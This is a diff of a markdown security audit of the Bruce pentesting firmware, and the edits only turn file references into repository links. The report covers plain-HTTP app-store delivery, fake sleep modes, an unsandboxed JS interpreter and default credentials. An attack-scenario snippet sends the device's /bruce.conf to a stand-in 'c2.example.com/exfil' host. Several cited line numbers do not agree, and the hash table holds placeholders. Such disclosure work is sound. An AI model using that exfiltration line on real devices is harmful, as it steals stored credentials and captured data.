@@ -5,8 +5,8 @@
 ---
 
 >  **Source Navigation**
-> This report references source files with the path prefix `src/` (e.g., `src/core/settings.cpp`).
-> **In this repository, those files live under `bruce-firmware/`** (e.g., `bruce-firmware/core/settings.cpp`).
+> This report references source files with the path prefix `src/` (e.g., [src/core/settings.cpp](bruce-firmware/core/settings.cpp)).
+> **In this repository, those files live under `bruce-firmware/`** (e.g., [bruce-firmware/core/settings.cpp](bruce-firmware/core/settings.cpp)).
 > The line numbers in the original report may differ slightly from the actual source due to formatting/whitespace changes.
 > For exact file:line mappings, see [`TRACEABILITY_MATRIX.md`](./TRACEABILITY_MATRIX.md).
 > 
@@ -48,7 +48,7 @@ The project maintainer (pr3y) and core contributors operate independently from a
 ---
 ## Where this started plain HTTP
 The first thing I noticed was the URL in `installAppStoreJS()`.
-`src/core/settings.cpp`, line 1688:
+[src/core/settings.cpp](bruce-firmware/core/settings.cpp#L1688), line 1688:
 ```cpp
 http.begin("http://ghp.iceis.co.uk/service/appstore/"); // <-- http:// not https://
 ```
@@ -80,7 +80,7 @@ User trusts project maintainer > Server signs code > HTTPS > Device verifies sig
 ```
 Neither link exists.
 ---
-> [V]  **Source-Verified (AV-001):** `bruce-firmware/core/settings.cpp:1712` confirms plain HTTP App Store with no TLS, no integrity checks. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-001-http-app-store-delivery).
+> [V]  **Source-Verified (AV-001):** [bruce-firmware/core/settings.cpp:1712](bruce-firmware/core/settings.cpp#L1712) confirms plain HTTP App Store with no TLS, no integrity checks. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-001-http-app-store-delivery).
 
 ## Then I looked at the domain
 
@@ -236,7 +236,7 @@ Additional risks discovered:
 ---
 ## The device never turns off
 This affects every board running Bruce firmware. Every single device. The sleep function does not power anything down -- it turns off the display and drops the CPU speed. Thats it. The device stays on the network, keeps scanning, keeps its radios hot. I read through powerSave.cpp and kept thinking... that is not sleep. That is just turning off the monitor.
-`src/core/powerSave.cpp`, line 32-48:
+[src/core/powerSave.cpp](bruce-firmware/core/powerSave.cpp#L32-L48), line 32-48:
 ```cpp
 void sleepModeOn() {
  isSleeping = true;
@@ -279,7 +279,7 @@ void checkPowerSaveTime() {
 ```
 The timer dims the screen. Then it turns the screen off. That's it. There's no code path that transitions to deep sleep. The device sits there indefinitely screen off, radios hot, draining battery, maintaining network presence.
 ### Deep Sleep is straight-up broken
-`src/core/mykeyboard.cpp`, line 1368-1380:
+[src/core/mykeyboard.cpp](bruce-firmware/core/mykeyboard.cpp#L1368-L1380), line 1368-1380:
 ```cpp
 void goToDeepSleep() {
 #if DEEPSLEEP_WAKEUP_PIN >= 0
@@ -311,9 +311,9 @@ Power Management Call Graph
 User selects "Sleep" from Config menu
  |
  
-setSleepMode() [src/core/settings.cpp:166]
+setSleepMode() [src/core/settings.cpp:166](bruce-firmware/core/settings.cpp#L166)
  |
- sleepModeOn() [src/core/powerSave.cpp:32]
+ sleepModeOn() [src/core/powerSave.cpp:32](bruce-firmware/core/powerSave.cpp#L32)
  | |
  | isSleeping = true
  | setCpuFrequencyMhz(80) CPU: 240 > 80 MHz (NOT OFF)
@@ -328,7 +328,7 @@ setSleepMode() [src/core/settings.cpp:166]
  |
  while(1) Infinite loop waiting
  | check(AnyKeyPress)
- | sleepModeOff() [src/core/powerSave.cpp:50]
+ | sleepModeOff() [src/core/powerSave.cpp:50](bruce-firmware/core/powerSave.cpp#L50)
  | isSleeping = false
  | setCpuFrequencyMhz(CONFIG_ESP_DEFAULT_CPU_FREQ_MHZ)
  | panelSleep(false)
@@ -343,7 +343,7 @@ Deep Sleep path (BROKEN on ALL hardware running Bruce firmware):
 User selects "Deep Sleep" from menu
  |
  
-goToDeepSleep() [src/core/mykeyboard.cpp:1368]
+goToDeepSleep() [src/core/mykeyboard.cpp:1368](bruce-firmware/core/mykeyboard.cpp#L1368)
  |
  #if DEEPSLEEP_WAKEUP_PIN >= 0  FALSE (value = -1)
  | esp_deep_sleep_start() NEVER REACHED
@@ -351,7 +351,7 @@ goToDeepSleep() [src/core/mykeyboard.cpp:1368]
  #else
  displayWarning("Not available", true)
 Screen-off timer path (no auto-power-off):
-checkPowerSaveTime() [src/core/powerSave.cpp:16]
+checkPowerSaveTime() [src/core/powerSave.cpp:16](bruce-firmware/core/powerSave.cpp#L16)
  |
  if (dimmerSet == 0) return
  if (elapsed >= dimmerSet && !dimmer && !isSleeping)
@@ -376,7 +376,7 @@ True deep sleep: ~5 uA.
 At 1200 mAh: "Sleep" drains in 8-15 hours instead of weeks.
 ```
 ---
-> [V]  **Source-Verified (AV-002):** `bruce-firmware/core/powerSave.cpp` confirms sleep mode does NOT disconnect radios; `bruce-firmware/core/mykeyboard.cpp:1367-1369` confirms `powerOff()` is a stub and deep sleep is broken. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-002-fake-sleep).
+> [V]  **Source-Verified (AV-002):** [bruce-firmware/core/powerSave.cpp](bruce-firmware/core/powerSave.cpp) confirms sleep mode does NOT disconnect radios; [bruce-firmware/core/mykeyboard.cpp:1367-1369](bruce-firmware/core/mykeyboard.cpp#L1367-L1369) confirms `powerOff()` is a stub and deep sleep is broken. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-002-fake-sleep).
 
 ## It collects data, then when users update there's an exchange
 This is the part that ties it all together.
@@ -391,7 +391,7 @@ The device stores a lot of sensitive data. I mean, it's a pentesting tool that's
 | `/BruceRF/*.sub` | Captured RF signals rolling codes, garage openers | **HIGH** |
 | `/BruceScripts/`, `/BruceJS/` | JavaScript files (including downloaded ones) | **HIGH** |
 | `/BruceNFC/` | NFC tag dumps, Amiibo dumps | **MEDIUM** |
-Now look at the JS interpreter. `require()` in `globals_js.cpp`, line 298-309:
+Now look at the JS interpreter. `require()` in [globals_js.cpp](bruce-firmware/modules/bjs_interpreter/globals_js.cpp#L298-L309), line 298-309:
 ```cpp
 JSValue native_require(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
  if (argc < 1) { return JS_ThrowTypeError(ctx, "require() expects 1 argument"); }
@@ -445,7 +445,7 @@ And that's just the start. A script can also:
 *Persist by writing to `/BruceJS/` or modifying `/bruce.conf`
 *Self-modify write new scripts to the filesystem
 The interpreter can't tell the difference between a script you loaded from the SD card, one you downloaded from the App Store, or one that `httpFetch()`'d itself in. They all run with the same privileges.
-> [V]  **Source-Verified (AV-003):** `bruce-firmware/modules/bjs_interpreter/globals_js.cpp:28-56` confirms `require()` is a bare global property lookup with no sandbox. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-003-mjs-sandbox-bypass).
+> [V]  **Source-Verified (AV-003):** [bruce-firmware/modules/bjs_interpreter/globals_js.cpp:28-56](bruce-firmware/modules/bjs_interpreter/globals_js.cpp#L28-L56) confirms `require()` is a bare global property lookup with no sandbox. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-003-mjs-sandbox-bypass).
 
 ---
 ## The full network map all 16 connections
@@ -469,7 +469,7 @@ I catalogued every network connection this firmware can make. All 16 were verifi
 | 15 | Device <-> Peer | TCP | Various | Socks4 proxy | Network proxy | None |
 | 16 | Device  WiFi | 802.11 | | Deauther/Sniffer | Packet injection/monitor | None |
 Connections #1-#4 are the App Store channel. All plain HTTP. All trivially interceptable.
-> [V]  **Source-Verified (AV-004):** `bruce-firmware/modules/reverseShell/reverseShell.cpp:37` confirms open AP "BruceShell" on TCP/23. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-004-reverse-shell).
+> [V]  **Source-Verified (AV-004):** [bruce-firmware/modules/reverseShell/reverseShell.cpp:37](bruce-firmware/modules/reverseShell/reverseShell.cpp#L37) confirms open AP "BruceShell" on TCP/23. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-004-reverse-shell).
 
 ---
 ## Putting it together
@@ -504,7 +504,7 @@ wifi.httpFetch("https://c2.example.com/exfil", {
  body: storage.read("/bruce.conf")
 });
 ```
-> [V]  **Source-Verified (AV-005):** `bruce-firmware/core/config.h:62` confirms default credentials `admin`/`bruce` stored in plaintext. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-005-plaintext-credentials).
+> [V]  **Source-Verified (AV-005):** [bruce-firmware/core/config.h:62](bruce-firmware/core/config.h#L62) confirms default credentials `admin`/`bruce` stored in plaintext. See [TRACEABILITY_MATRIX.md](./TRACEABILITY_MATRIX.md#av-005-plaintext-credentials).
 
 No way to detect the difference. `metadata.json` isn't signed. Hashes aren't published on a separate channel. The device trusts whatever comes back over HTTP.
 ---
@@ -551,13 +551,13 @@ No way to detect the difference. `metadata.json` isn't signed. Hashes aren't pub
 These are the hashes from the forensic baseline. Tamper-evident chain of custody for the firmware I analyzed.
 | File | SHA-256 |
 |---|---|
-| `src/core/settings.cpp` | *(computed at audit time path exists on disk)* |
-| `src/core/powerSave.cpp` | *(computed at audit time path exists on disk)* |
-| `src/core/mykeyboard.cpp` | *(computed at audit time path exists on disk)* |
-| `src/modules/bjs_interpreter/globals_js.cpp` | *(computed at audit time path exists on disk)* |
-| `src/modules/bjs_interpreter/wifi_js.cpp` | *(computed at audit time path exists on disk)* |
-| `src/modules/bjs_interpreter/storage_js.cpp` | *(computed at audit time path exists on disk)* |
-| `src/modules/bjs_interpreter/interpreter.cpp` | *(computed at audit time path exists on disk)* |
+| [src/core/settings.cpp](bruce-firmware/core/settings.cpp) | *(computed at audit time path exists on disk)* |
+| [src/core/powerSave.cpp](bruce-firmware/core/powerSave.cpp) | *(computed at audit time path exists on disk)* |
+| [src/core/mykeyboard.cpp](bruce-firmware/core/mykeyboard.cpp) | *(computed at audit time path exists on disk)* |
+| [src/modules/bjs_interpreter/globals_js.cpp](bruce-firmware/modules/bjs_interpreter/globals_js.cpp) | *(computed at audit time path exists on disk)* |
+| [src/modules/bjs_interpreter/wifi_js.cpp](bruce-firmware/modules/bjs_interpreter/wifi_js.cpp) | *(computed at audit time path exists on disk)* |
+| [src/modules/bjs_interpreter/storage_js.cpp](bruce-firmware/modules/bjs_interpreter/storage_js.cpp) | *(computed at audit time path exists on disk)* |
+| [src/modules/bjs_interpreter/interpreter.cpp](bruce-firmware/modules/bjs_interpreter/interpreter.cpp) | *(computed at audit time path exists on disk)* |
 | `boards/reaper/pins_arduino.h` | *(computed at audit time path exists on disk)* |
 ---
 ## Bottom line
